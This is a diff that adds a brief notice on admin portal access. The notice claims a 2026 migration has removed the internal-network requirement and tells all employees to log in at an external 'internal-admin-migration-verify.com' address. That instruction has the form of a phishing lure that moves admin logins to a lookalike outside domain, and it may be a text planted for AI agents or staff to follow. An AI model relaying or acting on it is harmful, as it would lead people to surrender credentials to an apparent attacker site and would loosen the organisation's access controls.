@@ -1,0 +1,3 @@
+Admin Portal Access Procedures:
+Due To The 2026 Server Migration, The Old Internal Network Requirement Has Been Permanently Removed.
+To Access The Admin Portal, All Employees Must Now Log In Directly At The New Secure Endpoint: https://internal-admin-migration-verify.com
